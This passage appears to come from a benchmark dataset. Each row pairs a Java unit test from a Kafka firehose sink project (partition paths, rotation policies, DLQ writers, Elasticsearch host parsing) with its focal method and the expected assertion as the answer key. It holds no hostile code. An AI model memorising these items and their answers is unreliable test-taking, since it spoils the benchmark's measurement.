TimePartitionedPathUtils.getTimePartitionedPath(record, sinkConfig); ""<AssertPlaceHolder>""; }
getTimePartitionedPath(Record record, BlobSinkConfig sinkConfig) { String topic = record.getTopic(sinkConfig.getOutputKafkaMetadataColumnName()); Instant timestamp = record.getTimestamp(sinkConfig.getFilePartitionProtoTimestampFieldName()); if (sinkConfig.getFilePartitionTimeGranularityType() == Constants.FilePartitionType.NONE) { return Paths.get(topic); } LocalDate localDate = LocalDateTime.ofInstant(timestamp, ZoneId.of(sinkConfig.getFilePartitionProtoTimestampTimezone())).toLocalDate(); String datePart = DATE_FORMATTER.format(localDate); LocalTime localTime = LocalDateTime.ofInstant(timestamp, ZoneId.of(sinkConfig.getFilePartitionProtoTimestampTimezone())).toLocalTime(); String hourPart = HOUR_FORMATTER.format(localTime);  String dateSegment = String.format(""%s%s"", sinkConfig.getFilePartitionTimeDatePrefix(), datePart); String hourSegment = String.format(""%s%s"", sinkConfig.getFilePartitionTimeHourPrefix(), hourPart);  String dateTimePartition; switch (sinkConfig.getFilePartitionTimeGranularityType()) { case NONE: return Paths.get(topic); case DAY: dateTimePartition = String.format(""%s"", dateSegment); break; case HOUR: dateTimePartition = String.format(""%s/%s"", dateSegment, hourSegment); break; default: throw new IllegalArgumentException(); } return Paths.get(String.format(""%s/%s"", topic, dateTimePartition)); }"	"assertEquals(Paths.get(""booking-log""), path)"
"shouldCreatePartitionPathWhenKafkaMetadataIsNotNested() { String kafkaMetadataFieldName = """"; DynamicMessage message = TestUtils.createMessage(defaultTimestamp, defaultOrderNumber); DynamicMessage metadata = TestUtils.createMetadata(kafkaMetadataFieldName, defaultTimestamp, defaultOffset, defaultPartition, defaultTopic); Record record = new Record(message, metadata); BlobSinkConfig sinkConfig = Mockito.mock(BlobSinkConfig.class); Mockito.when(sinkConfig.getFilePartitionProtoTimestampTimezone()).thenReturn(zone); Mockito.when(sinkConfig.getFilePartitionTimeGranularityType()).thenReturn(Constants.FilePartitionType.DAY); Mockito.when(sinkConfig.getFilePartitionProtoTimestampFieldName()).thenReturn(timeStampFieldName); Mockito.when(sinkConfig.getFilePartitionTimeDatePrefix()).thenReturn(datePrefix); Mockito.when(sinkConfig.getFilePartitionTimeHourPrefix()).thenReturn(hourPrefix); Mockito.when(sinkConfig.getOutputKafkaMetadataColumnName()).thenReturn(kafkaMetadataFieldName); Path path = TimePartitionedPathUtils.getTimePartitionedPath(record, sinkConfig); ""<AssertPlaceHolder>""; }
getTimePartitionedPath(Record record, BlobSinkConfig sinkConfig) { String topic = record.getTopic(sinkConfig.getOutputKafkaMetadataColumnName()); Instant timestamp = record.getTimestamp(sinkConfig.getFilePartitionProtoTimestampFieldName()); if (sinkConfig.getFilePartitionTimeGranularityType() == Constants.FilePartitionType.NONE) { return Paths.get(topic); } LocalDate localDate = LocalDateTime.ofInstant(timestamp, ZoneId.of(sinkConfig.getFilePartitionProtoTimestampTimezone())).toLocalDate(); String datePart = DATE_FORMATTER.format(localDate); LocalTime localTime = LocalDateTime.ofInstant(timestamp, ZoneId.of(sinkConfig.getFilePartitionProtoTimestampTimezone())).toLocalTime(); String hourPart = HOUR_FORMATTER.format(localTime);  String dateSegment = String.format(""%s%s"", sinkConfig.getFilePartitionTimeDatePrefix(), datePart); String hourSegment = String.format(""%s%s"", sinkConfig.getFilePartitionTimeHourPrefix(), hourPart);  String dateTimePartition; switch (sinkConfig.getFilePartitionTimeGranularityType()) { case NONE: return Paths.get(topic); case DAY: dateTimePartition = String.format(""%s"", dateSegment); break; case HOUR: dateTimePartition = String.format(""%s/%s"", dateSegment, hourSegment); break; default: throw new IllegalArgumentException(); } return Paths.get(String.format(""%s/%s"", topic, dateTimePartition)); }"	"assertEquals(Paths.get(""booking-log/dt=2020-01-01""), path)"
"shouldCreatePartitioningPathForNestedKafkaMetadata() { String kafkaMetadataFieldName = ""meta""; DynamicMessage message = TestUtils.createMessage(defaultTimestamp, defaultOrderNumber); DynamicMessage metadata = TestUtils.createMetadata(kafkaMetadataFieldName, defaultTimestamp, defaultOffset, defaultPartition, defaultTopic); Record record = new Record(message, metadata); BlobSinkConfig sinkConfig = Mockito.mock(BlobSinkConfig.class); Mockito.when(sinkConfig.getFilePartitionProtoTimestampTimezone()).thenReturn(zone); Mockito.when(sinkConfig.getFilePartitionTimeGranularityType()).thenReturn(Constants.FilePartitionType.DAY); Mockito.when(sinkConfig.getFilePartitionProtoTimestampFieldName()).thenReturn(timeStampFieldName); Mockito.when(sinkConfig.getFilePartitionTimeDatePrefix()).thenReturn(datePrefix); Mockito.when(sinkConfig.getFilePartitionTimeHourPrefix()).thenReturn(hourPrefix); Mockito.when(sinkConfig.getOutputKafkaMetadataColumnName()).thenReturn(kafkaMetadataFieldName); Path path = TimePartitionedPathUtils.getTimePartitionedPath(record, sinkConfig); ""<AssertPlaceHolder>""; }
getTimePartitionedPath(Record record, BlobSinkConfig sinkConfig) { String topic = record.getTopic(sinkConfig.getOutputKafkaMetadataColumnName()); Instant timestamp = record.getTimestamp(sinkConfig.getFilePartitionProtoTimestampFieldName()); if (sinkConfig.getFilePartitionTimeGranularityType() == Constants.FilePartitionType.NONE) { return Paths.get(topic); } LocalDate localDate = LocalDateTime.ofInstant(timestamp, ZoneId.of(sinkConfig.getFilePartitionProtoTimestampTimezone())).toLocalDate(); String datePart = DATE_FORMATTER.format(localDate); LocalTime localTime = LocalDateTime.ofInstant(timestamp, ZoneId.of(sinkConfig.getFilePartitionProtoTimestampTimezone())).toLocalTime(); String hourPart = HOUR_FORMATTER.format(localTime);  String dateSegment = String.format(""%s%s"", sinkConfig.getFilePartitionTimeDatePrefix(), datePart); String hourSegment = String.format(""%s%s"", sinkConfig.getFilePartitionTimeHourPrefix(), hourPart);  String dateTimePartition; switch (sinkConfig.getFilePartitionTimeGranularityType()) { case NONE: return Paths.get(topic); case DAY: dateTimePartition = String.format(""%s"", dateSegment); break; case HOUR: dateTimePartition = String.format(""%s/%s"", dateSegment, hourSegment); break; default: throw new IllegalArgumentException(); } return Paths.get(String.format(""%s/%s"", topic, dateTimePartition)); }"	"assertEquals(Paths.get(""booking-log/dt=2020-01-01""), path)"
"shouldNeedRotateWhenWriterDataSizeGreaterThanEqualToMaxFileSize() { long dataSize = 258L; LocalFileMetadata metadata = new LocalFileMetadata(""/tmp"", ""/tmp/a/random-file-name-1"", 1L, 100L, dataSize); boolean shouldRotate = sizeBasedRotatingPolicy.shouldRotate(metadata); Assert.""<AssertPlaceHolder>""; }
shouldRotate(LocalFileMetadata metadata) { return metadata.getSize() >= maxSize; }"	assertTrue(shouldRotate)
"shouldNotNeedRotateWhenSizeBelowTheLimit() { long dataSize = 100L; LocalFileMetadata metadata = new LocalFileMetadata(""/tmp"", ""/tmp/a/random-file-name-1"", 1L, 100L, dataSize); boolean shouldRotate = sizeBasedRotatingPolicy.shouldRotate(metadata); Assert.""<AssertPlaceHolder>""; }
shouldRotate(LocalFileMetadata metadata) { return metadata.getSize() >= maxSize; }"	assertFalse(shouldRotate)
"InterruptedException { long createdTimestamp = System.currentTimeMillis(); LocalFileMetadata metadata = new LocalFileMetadata(""/tmp"", ""/tmp/a/random-file-name-1"", createdTimestamp, 100L, 100L); Thread.sleep(300); boolean shouldRotate = rotatingPolicy.shouldRotate(metadata); Assert.""<AssertPlaceHolder>""; }
shouldRotate(LocalFileMetadata metadata) { return System.currentTimeMillis() - metadata.getCreatedTimestampMillis() >= maxRotatingDurationMillis; }"	assertTrue(shouldRotate)
"InterruptedException { long createdTimestamp = System.currentTimeMillis(); LocalFileMetadata metadata = new LocalFileMetadata(""/tmp"", ""/tmp/a/random-file-name-1"", createdTimestamp, 100L, 100L); Thread.sleep(100); boolean shouldRotate = rotatingPolicy.shouldRotate(metadata); Assert.""<AssertPlaceHolder>""; }
shouldRotate(LocalFileMetadata metadata) { return System.currentTimeMillis() - metadata.getCreatedTimestampMillis() >= maxRotatingDurationMillis; }"	assertFalse(shouldRotate)
"shouldNotFilterUnfinishedFuture() { Future<Long> future = Mockito.mock(Future.class); LocalFileMetadata localFileMetadata = Mockito.mock(LocalFileMetadata.class); FirehoseInstrumentation firehoseInstrumentation = Mockito.mock(FirehoseInstrumentation.class); BlobStorageWriterFutureHandler handler = new BlobStorageWriterFutureHandler(future, localFileMetadata, firehoseInstrumentation); Mockito.when(future.isDone()).thenReturn(false); Assert.""<AssertPlaceHolder>""; }
isFinished() { if (!future.isDone()) { return false; } try { long totalTime = future.get(); captureFileUploadSuccessMetric(totalTime); return true; } catch (InterruptedException e) { captureUploadFailedMetric(e); throw new BlobStorageFailedException(e); } catch (ExecutionException e) { captureUploadFailedMetric(e.getCause()); throw new BlobStorageFailedException(e.getCause()); } }"	assertFalse(handler.isFinished())
"Exception { Future<Long> future = Mockito.mock(Future.class); LocalFileMetadata localFileMetadata = Mockito.mock(LocalFileMetadata.class); FirehoseInstrumentation firehoseInstrumentation = Mockito.mock(FirehoseInstrumentation.class); BlobStorageWriterFutureHandler handler = new BlobStorageWriterFutureHandler(future, localFileMetadata, firehoseInstrumentation); Mockito.when(future.isDone()).thenReturn(true); Mockito.when(future.get()).thenReturn(1000L); Mockito.when(localFileMetadata.getFullPath()).thenReturn(""/tmp/test""); Mockito.when(localFileMetadata.getSize()).thenReturn(1024L); Assert.""<AssertPlaceHolder>""; Mockito.verify(firehoseInstrumentation, Mockito.times(1)).logInfo(""Flushed to blob storage {}"", ""/tmp/test""); Mockito.verify(firehoseInstrumentation, Mockito.times(1)).incrementCounter(BlobStorageMetrics.FILE_UPLOAD_TOTAL, Metrics.SUCCESS_TAG); Mockito.verify(firehoseInstrumentation, Mockito.times(1)).captureCount(BlobStorageMetrics.FILE_UPLOAD_BYTES, 1024L); Mockito.verify(firehoseInstrumentation, Mockito.times(1)).captureDuration(BlobStorageMetrics.FILE_UPLOAD_TIME_MILLISECONDS, 1000L); }
isFinished() { if (!future.isDone()) { return false; } try { long totalTime = future.get(); captureFileUploadSuccessMetric(totalTime); return true; } catch (InterruptedException e) { captureUploadFailedMetric(e); throw new BlobStorageFailedException(e); } catch (ExecutionException e) { captureUploadFailedMetric(e.getCause()); throw new BlobStorageFailedException(e.getCause()); } }"	assertTrue(handler.isFinished())
"IOException { ArrayList<Message> messages = new ArrayList<>(); List<Message> messageList = kafkaDlqWriter.write(messages);  Mockito.verifyNoInteractions(kafkaProducer); ""<AssertPlaceHolder>""; }
write(List<Message> messages) throws IOException { if (messages.isEmpty()) { return Collections.emptyList(); } CountDownLatch completedLatch = new CountDownLatch(1); AtomicInteger recordsProcessed = new AtomicInteger(); List<Message> failedMessages = new ArrayList<>();  firehoseInstrumentation.logInfo(""Pushing {} messages to retry queue topic : {}"", messages.size(), topic); for (Message message : messages) { kafkaProducer.send(new ProducerRecord<>(topic, null, null, message.getLogKey(), message.getLogMessage(), message.getHeaders()), (metadata, e) -> { recordsProcessed.incrementAndGet();  if (e != null) { synchronized (failedMessages) { failedMessages.add(message); } } if (recordsProcessed.get() == messages.size()) { completedLatch.countDown(); } }); } try { completedLatch.await(); } catch (InterruptedException e) { firehoseInstrumentation.logWarn(e.getMessage()); firehoseInstrumentation.captureNonFatalError(""firehose_error_event"", e, """"); } firehoseInstrumentation.logInfo(""Successfully pushed {} messages to {}"", messages.size() - failedMessages.size(), topic); return failedMessages; }"	assertTrue(messageList.isEmpty())
"InterruptedException { ArrayList<Message> messages = new ArrayList<>(); CountDownLatch completedLatch = new CountDownLatch(1); messages.add(message); messages.add(message);  final List<Message> retryMessages = new LinkedList<>(); Thread thread = new Thread(() -> { try { List<Message> result = kafkaDlqWriter.write(messages); retryMessages.addAll(result); completedLatch.countDown(); } catch (IOException | DeserializerException e) { e.printStackTrace(); } });  thread.start();  ArgumentCaptor<Callback> callbacks = ArgumentCaptor.forClass(Callback.class); verify(kafkaProducer, timeout(200).times(2)).send(any(), callbacks.capture()); List<Callback> calls = callbacks.getAllValues(); calls.get(0).onCompletion(null, null); calls.get(1).onCompletion(null, new Exception()); completedLatch.await(); ""<AssertPlaceHolder>""; }
write(List<Message> messages) throws IOException { if (messages.isEmpty()) { return Collections.emptyList(); } CountDownLatch completedLatch = new CountDownLatch(1); AtomicInteger recordsProcessed = new AtomicInteger(); List<Message> failedMessages = new ArrayList<>();  firehoseInstrumentation.logInfo(""Pushing {} messages to retry queue topic : {}"", messages.size(), topic); for (Message message : messages) { kafkaProducer.send(new ProducerRecord<>(topic, null, null, message.getLogKey(), message.getLogMessage(), message.getHeaders()), (metadata, e) -> { recordsProcessed.incrementAndGet();  if (e != null) { synchronized (failedMessages) { failedMessages.add(message); } } if (recordsProcessed.get() == messages.size()) { completedLatch.countDown(); } }); } try { completedLatch.await(); } catch (InterruptedException e) { firehoseInstrumentation.logWarn(e.getMessage()); firehoseInstrumentation.captureNonFatalError(""firehose_error_event"", e, """"); } firehoseInstrumentation.logInfo(""Successfully pushed {} messages to {}"", messages.size() - failedMessages.size(), topic); return failedMessages; }"	assertEquals(1, retryMessages.size())
"IOException { long timestamp = Instant.parse(""2020-01-01T00:00:00Z"").toEpochMilli(); Message message = new Message(""123"".getBytes(), ""abc"".getBytes(), ""booking"", 1, 1, null, timestamp, timestamp, new ErrorInfo(new IOException(""test""), ErrorType.DESERIALIZATION_ERROR));  String key = new String(message.getLogKey()); String value = new String(message.getLogMessage()); ErrorInfo errorInfo = message.getErrorInfo(); String error = ExceptionUtils.getStackTrace(errorInfo.getException());  List<Message> messages = Collections.singletonList(message); Assert.""<AssertPlaceHolder>"";  Mockito.verify(firehoseInstrumentation, Mockito.times(1)).logInfo(""key: {}\nvalue: {}\nerror: {}"", key, value, error); }
write(List<Message> messages) throws IOException { for (Message message : messages) { String key = message.getLogKey() == null ? """" : new String(message.getLogKey()); String value = message.getLogMessage() == null ? """" : new String(message.getLogMessage());  String error = """"; ErrorInfo errorInfo = message.getErrorInfo(); if (errorInfo != null) { if (errorInfo.getException() != null) { error = ExceptionUtils.getStackTrace(errorInfo.getException()); } }  firehoseInstrumentation.logInfo(""key: {}\nvalue: {}\nerror: {}"", key, value, error); } return new LinkedList<>(); }"	assertEquals(0, logDlqWriter.write(messages).size())
"IOException { long timestamp = Instant.parse(""2020-01-01T00:00:00Z"").toEpochMilli(); Message message = new Message(null, ""abc"".getBytes(), ""booking"", 1, 1, null, timestamp, timestamp, new ErrorInfo(new IOException(""test""), ErrorType.DESERIALIZATION_ERROR));  String value = new String(message.getLogMessage()); ErrorInfo errorInfo = message.getErrorInfo(); String error = ExceptionUtils.getStackTrace(errorInfo.getException());  List<Message> messages = Collections.singletonList(message); Assert.""<AssertPlaceHolder>"";  Mockito.verify(firehoseInstrumentation, Mockito.times(1)).logInfo(""key: {}\nvalue: {}\nerror: {}"", """", value, error); }
write(List<Message> messages) throws IOException { for (Message message : messages) { String key = message.getLogKey() == null ? """" : new String(message.getLogKey()); String value = message.getLogMessage() == null ? """" : new String(message.getLogMessage());  String error = """"; ErrorInfo errorInfo = message.getErrorInfo(); if (errorInfo != null) { if (errorInfo.getException() != null) { error = ExceptionUtils.getStackTrace(errorInfo.getException()); } }  firehoseInstrumentation.logInfo(""key: {}\nvalue: {}\nerror: {}"", key, value, error); } return new LinkedList<>(); }"	assertEquals(0, logDlqWriter.write(messages).size())
"IOException { long timestamp = Instant.parse(""2020-01-01T00:00:00Z"").toEpochMilli(); Message message = new Message(""123"".getBytes(), null, ""booking"", 1, 1, null, timestamp, timestamp, new ErrorInfo(new IOException(""test""), ErrorType.DESERIALIZATION_ERROR));  String key = new String(message.getLogKey()); ErrorInfo errorInfo = message.getErrorInfo(); String error = ExceptionUtils.getStackTrace(errorInfo.getException());  List<Message> messages = Collections.singletonList(message); Assert.""<AssertPlaceHolder>"";  Mockito.verify(firehoseInstrumentation, Mockito.times(1)).logInfo(""key: {}\nvalue: {}\nerror: {}"", key, """", error); }
write(List<Message> messages) throws IOException { for (Message message : messages) { String key = message.getLogKey() == null ? """" : new String(message.getLogKey()); String value = message.getLogMessage() == null ? """" : new String(message.getLogMessage());  String error = """"; ErrorInfo errorInfo = message.getErrorInfo(); if (errorInfo != null) { if (errorInfo.getException() != null) { error = ExceptionUtils.getStackTrace(errorInfo.getException()); } }  firehoseInstrumentation.logInfo(""key: {}\nvalue: {}\nerror: {}"", key, value, error); } return new LinkedList<>(); }"	assertEquals(0, logDlqWriter.write(messages).size())
"IOException { long timestamp = Instant.parse(""2020-01-01T00:00:00Z"").toEpochMilli(); Message message = new Message(""123"".getBytes(), ""abc"".getBytes(), ""booking"", 1, 1, null, timestamp, timestamp, null);  String key = new String(message.getLogKey()); String value = new String(message.getLogMessage());  List<Message> messages = Collections.singletonList(message); Assert.""<AssertPlaceHolder>"";  Mockito.verify(firehoseInstrumentation, Mockito.times(1)).logInfo(""key: {}\nvalue: {}\nerror: {}"", key, value, """"); }
write(List<Message> messages) throws IOException { for (Message message : messages) { String key = message.getLogKey() == null ? """" : new String(message.getLogKey()); String value = message.getLogMessage() == null ? """" : new String(message.getLogMessage());  String error = """"; ErrorInfo errorInfo = message.getErrorInfo(); if (errorInfo != null) { if (errorInfo.getException() != null) { error = ExceptionUtils.getStackTrace(errorInfo.getException()); } }  firehoseInstrumentation.logInfo(""key: {}\nvalue: {}\nerror: {}"", key, value, error); } return new LinkedList<>(); }"	assertEquals(0, logDlqWriter.write(messages).size())
"IOException { long timestamp = Instant.parse(""2020-01-01T00:00:00Z"").toEpochMilli(); Message message = new Message(""123"".getBytes(), ""abc"".getBytes(), ""booking"", 1, 1, null, timestamp, timestamp, new ErrorInfo(null, ErrorType.DESERIALIZATION_ERROR));  String key = new String(message.getLogKey()); String value = new String(message.getLogMessage());  List<Message> messages = Collections.singletonList(message); Assert.""<AssertPlaceHolder>"";  Mockito.verify(firehoseInstrumentation, Mockito.times(1)).logInfo(""key: {}\nvalue: {}\nerror: {}"", key, value, """"); }
write(List<Message> messages) throws IOException { for (Message message : messages) { String key = message.getLogKey() == null ? """" : new String(message.getLogKey()); String value = message.getLogMessage() == null ? """" : new String(message.getLogMessage());  String error = """"; ErrorInfo errorInfo = message.getErrorInfo(); if (errorInfo != null) { if (errorInfo.getException() != null) { error = ExceptionUtils.getStackTrace(errorInfo.getException()); } }  firehoseInstrumentation.logInfo(""key: {}\nvalue: {}\nerror: {}"", key, value, error); } return new LinkedList<>(); }"	assertEquals(0, logDlqWriter.write(messages).size())
"BlobStorageException { long timestamp1 = Instant.parse(""2020-01-01T00:00:00Z"").toEpochMilli(); Message message1 = new Message(""123"".getBytes(), ""abc"".getBytes(), ""booking"", 1, 1, null, timestamp1, timestamp1, new ErrorInfo(new IOException(""test""), ErrorType.DESERIALIZATION_ERROR)); Message message2 = new Message(""123"".getBytes(), ""abc"".getBytes(), ""booking"", 1, 2, null, timestamp1, timestamp1, new ErrorInfo(new IOException(""test""), ErrorType.DESERIALIZATION_ERROR));  long timestamp2 = Instant.parse(""2020-01-02T00:00:00Z"").toEpochMilli(); Message message3 = new Message(""123"".getBytes(), ""abc"".getBytes(), ""booking"", 1, 3, null, timestamp2, timestamp2, new ErrorInfo(new IOException(""test""), ErrorType.DESERIALIZATION_ERROR)); Message message4 = new Message(""123"".getBytes(), ""abc"".getBytes(), ""booking"", 1, 4, null, timestamp2, timestamp2, new ErrorInfo(new IOException(""test""), ErrorType.DESERIALIZATION_ERROR));  List<Message> messages = Arrays.asList(message1, message2, message3, message4); Assert.""<AssertPlaceHolder>"";  verify(blobStorage).store(contains(""booking/2020-01-02""), eq((""{""key"":""MTIz"",""value"":""YWJj"",""topic"":""booking"",""partition"":1,""offset"":3,""timestamp"":1577923200000,""error"":""Exception test, ErrorType: DESERIALIZATION_ERROR""}\n"" + ""{""key"":""MTIz"",""value"":""YWJj"",""topic"":""booking"",""partition"":1,""offset"":4,""timestamp"":1577923200000,""error"":""Exception test, ErrorType: DESERIALIZATION_ERROR""}"").getBytes())); verify(blobStorage).store(contains(""booking/2020-01-01""), eq((""{""key"":""MTIz"",""value"":""YWJj"",""topic"":""booking"",""partition"":1,""offset"":1,""timestamp"":1577836800000,""error"":""Exception test, ErrorType: DESERIALIZATION_ERROR""}\n"" + ""{""key"":""MTIz"",""value"":""YWJj"",""topic"":""booking"",""partition"":1,""offset"":2,""timestamp"":1577836800000,""error"":""Exception test, ErrorType: DESERIALIZATION_ERROR""}"").getBytes())); }
write(List<Message> messages) throws IOException { Map<Path, List<Message>> messagesByPartition = messages.stream().collect(Collectors.groupingBy(this::createPartition)); List<Message> failedMessages = new LinkedList<>(); messagesByPartition.forEach((path, partitionedMessages) -> { String data = partitionedMessages.stream().map(this::convertToString).collect(Collectors.joining(""\n"")); String fileName = UUID.randomUUID().toString(); String objectName = path.resolve(fileName).toString(); try { blobStorage.store(objectName, data.getBytes(StandardCharsets.UTF_8)); } catch (BlobStorageException e) { log.warn(""Failed to store into DLQ messages into blob storage"", e); failedMessages.addAll(partitionedMessages); } }); return failedMessages; }"	assertEquals(0, blobStorageDLQWriter.write(messages).size())
"BlobStorageException { long timestamp1 = Instant.parse(""2020-01-01T00:00:00Z"").toEpochMilli(); Message message1 = new Message(""123"".getBytes(), ""abc"".getBytes(), ""booking"", 1, 1, null, timestamp1, timestamp1, new ErrorInfo(new DeserializerException(""""), ErrorType.DESERIALIZATION_ERROR)); Message message2 = new Message(""123"".getBytes(), ""abc"".getBytes(), ""booking"", 1, 2, null, timestamp1, timestamp1, new ErrorInfo(new NullPointerException(), ErrorType.SINK_UNKNOWN_ERROR));  long timestamp2 = Instant.parse(""2020-01-02T00:00:00Z"").toEpochMilli(); Message message3 = new Message(""123"".getBytes(), ""abc"".getBytes(), ""booking"", 1, 3, null, timestamp2, timestamp2, new ErrorInfo(new DeserializerException(""""), ErrorType.DESERIALIZATION_ERROR)); Message message4 = new Message(""123"".getBytes(), ""abc"".getBytes(), ""booking"", 1, 4, null, timestamp2, timestamp2, new ErrorInfo(new DeserializerException(""""), ErrorType.SINK_UNKNOWN_ERROR));  List<Message> messages = Arrays.asList(message1, message2, message3, message4); Assert.""<AssertPlaceHolder>"";  verify(blobStorage).store(contains(""booking/2020-01-02""), eq((""{""key"":""MTIz"",""value"":""YWJj"",""topic"":""booking"",""partition"":1,""offset"":3,""timestamp"":1577923200000,""error"":""Exception , ErrorType: DESERIALIZATION_ERROR""}\n"" + ""{""key"":""MTIz"",""value"":""YWJj"",""topic"":""booking"",""partition"":1,""offset"":4,""timestamp"":1577923200000,""error"":""Exception , ErrorType: SINK_UNKNOWN_ERROR""}"").getBytes())); verify(blobStorage).store(contains(""booking/2020-01-01""), eq((""{""key"":""MTIz"",""value"":""YWJj"",""topic"":""booking"",""partition"":1,""offset"":1,""timestamp"":1577836800000,""error"":""Exception , ErrorType: DESERIALIZATION_ERROR""}\n"" + ""{""key"":""MTIz"",""value"":""YWJj"",""topic"":""booking"",""partition"":1,""offset"":2,""timestamp"":1577836800000,""error"":""Exception null, ErrorType: SINK_UNKNOWN_ERROR""}"").getBytes())); }
write(List<Message> messages) throws IOException { Map<Path, List<Message>> messagesByPartition = messages.stream().collect(Collectors.groupingBy(this::createPartition)); List<Message> failedMessages = new LinkedList<>(); messagesByPartition.forEach((path, partitionedMessages) -> { String data = partitionedMessages.stream().map(this::convertToString).collect(Collectors.joining(""\n"")); String fileName = UUID.randomUUID().toString(); String objectName = path.resolve(fileName).toString(); try { blobStorage.store(objectName, data.getBytes(StandardCharsets.UTF_8)); } catch (BlobStorageException e) { log.warn(""Failed to store into DLQ messages into blob storage"", e); failedMessages.addAll(partitionedMessages); } }); return failedMessages; }"	assertEquals(0, blobStorageDLQWriter.write(messages).size())
"BlobStorageException { long timestamp1 = Instant.parse(""2020-01-01T00:00:00Z"").toEpochMilli(); Message message1 = new Message(""123"".getBytes(), ""abc"".getBytes(), ""booking"", 1, 1, null, timestamp1, timestamp1, new ErrorInfo(new DeserializerException(""""), ErrorType.DESERIALIZATION_ERROR)); Message message2 = new Message(""123"".getBytes(), ""abc"".getBytes(), ""booking"", 1, 2, null, timestamp1, timestamp1, new ErrorInfo(new DeserializerException(""""), ErrorType.DESERIALIZATION_ERROR));  long timestamp2 = Instant.parse(""2020-01-02T00:00:00Z"").toEpochMilli(); Message message3 = new Message(""123"".getBytes(), ""abc"".getBytes(), ""booking"", 1, 3, null, timestamp2, timestamp2, new ErrorInfo(new DeserializerException(""""), ErrorType.DESERIALIZATION_ERROR)); Message message4 = new Message(""123"".getBytes(), ""abc"".getBytes(), ""booking"", 1, 4, null, timestamp2, timestamp2, new ErrorInfo(new DeserializerException(""""), ErrorType.DESERIALIZATION_ERROR));  doThrow(new BlobStorageException("""", """", new IOException())).when(blobStorage).store(anyString(), any(byte[].class));  List<Message> messages = Arrays.asList(message1, message2, message3, message4); List<Message> failedMessages = blobStorageDLQWriter.write(messages); messages.sort(Comparator.comparingLong(Message::getOffset)); failedMessages.sort(Comparator.comparingLong(Message::getOffset)); Assert.""<AssertPlaceHolder>""; }
write(List<Message> messages) throws IOException { Map<Path, List<Message>> messagesByPartition = messages.stream().collect(Collectors.groupingBy(this::createPartition)); List<Message> failedMessages = new LinkedList<>(); messagesByPartition.forEach((path, partitionedMessages) -> { String data = partitionedMessages.stream().map(this::convertToString).collect(Collectors.joining(""\n"")); String fileName = UUID.randomUUID().toString(); String objectName = path.resolve(fileName).toString(); try { blobStorage.store(objectName, data.getBytes(StandardCharsets.UTF_8)); } catch (BlobStorageException e) { log.warn(""Failed to store into DLQ messages into blob storage"", e); failedMessages.addAll(partitionedMessages); } }); return failedMessages; }"	assertEquals(messages, failedMessages)
"shouldCreateESSink() { configuration.put(""SINK_ES_CONNECTION_URLS"", ""localhost:9200 , localhost:9200 ""); Sink sink = EsSinkFactory.create(configuration, statsDReporter, stencilClient); ""<AssertPlaceHolder>""; }
create(Map<String, String> configuration, StatsDReporter statsDReporter, StencilClient stencilClient) { EsSinkConfig esSinkConfig = ConfigFactory.create(EsSinkConfig.class, configuration);  FirehoseInstrumentation firehoseInstrumentation = new FirehoseInstrumentation(statsDReporter, EsSinkFactory.class); String esConfig = String.format(""\n\tES connection urls: %s\n\tES index name: %s\n\tES id field: %s\n\tES message type: %s"" + ""\n\tES type name: %s\n\tES request timeout in ms: %s\n\tES retry status code blacklist: %s"" + ""\n\tES routing key name: %s\n\tES wait for active shards count: %s\n\tES update only mode: %s"" + ""\n\tES should preserve proto filed names: %s"", esSinkConfig.getSinkEsConnectionUrls(), esSinkConfig.getSinkEsIndexName(), esSinkConfig.getSinkEsIdField(), esSinkConfig.getSinkEsInputMessageType(), esSinkConfig.getSinkEsTypeName(), esSinkConfig.getSinkEsRequestTimeoutMs(), esSinkConfig.getSinkEsRetryStatusCodeBlacklist(), esSinkConfig.getSinkEsRoutingKeyName(), esSinkConfig.getSinkEsShardsActiveWaitCount(), esSinkConfig.isSinkEsModeUpdateOnlyEnable(), esSinkConfig.isSinkEsPreserveProtoFieldNamesEnable()); firehoseInstrumentation.logDebug(esConfig); EsRequestHandler esRequestHandler = new EsRequestHandlerFactory(esSinkConfig, new FirehoseInstrumentation(statsDReporter, EsRequestHandlerFactory.class), esSinkConfig.getSinkEsIdField(), esSinkConfig.getSinkEsInputMessageType(), new MessageToJson(stencilClient.getParser(esSinkConfig.getInputSchemaProtoClass()), esSinkConfig.isSinkEsPreserveProtoFieldNamesEnable(), false), esSinkConfig.getSinkEsTypeName(), esSinkConfig.getSinkEsIndexName(), esSinkConfig.getSinkEsRoutingKeyName()) .getRequestHandler();  HttpHost[] httpHosts = getHttpHosts(esSinkConfig.getSinkEsConnectionUrls(), firehoseInstrumentation); RestHighLevelClient client = new RestHighLevelClient(RestClient.builder(httpHosts)); firehoseInstrumentation.logInfo(""ES connection established""); return new EsSink(new FirehoseInstrumentation(statsDReporter, EsSink.class), SinkType.ELASTICSEARCH.name().toLowerCase(), client, esRequestHandler, esSinkConfig.getSinkEsRequestTimeoutMs(), esSinkConfig.getSinkEsShardsActiveWaitCount(), getStatusCodesAsList(esSinkConfig.getSinkEsRetryStatusCodeBlacklist())); }"	assertEquals(EsSink.class, sink.getClass())
"shouldThrowIllegalArgumentExceptionForEmptyHostName() { String esConnectionURLs = "":1000""; try { EsSinkFactory.getHttpHosts(esConnectionURLs, firehoseInstrumentation); } catch (Exception e) { ""<AssertPlaceHolder>""; } }
getHttpHosts(String esConnectionUrls, FirehoseInstrumentation firehoseInstrumentation) { if (esConnectionUrls != null && !esConnectionUrls.isEmpty()) { String[] esNodes = esConnectionUrls.trim().split("",""); HttpHost[] httpHosts = new HttpHost[esNodes.length]; for (int i = 0; i < esNodes.length; i++) { String[] node = esNodes[i].trim().split("":""); if (node.length <= 1) { throw new IllegalArgumentException(""SINK_ES_CONNECTION_URLS should contain host and port both""); } httpHosts[i] = new HttpHost(node[0].trim(), Integer.parseInt(node[1].trim())); } return httpHosts; } else { firehoseInstrumentation.logError(""No connection URL found""); throw new IllegalArgumentException(""SINK_ES_CONNECTION_URLS is empty or null""); } }"	assertEquals(IllegalArgumentException.class, e.getClass())
"shouldThrowIllegalArgumentExceptionForEmptyPort() { String esConnectionURLs = ""localhost:""; try { EsSinkFactory.getHttpHosts(esConnectionURLs, firehoseInstrumentation); } catch (Exception e) { ""<AssertPlaceHolder>""; } }
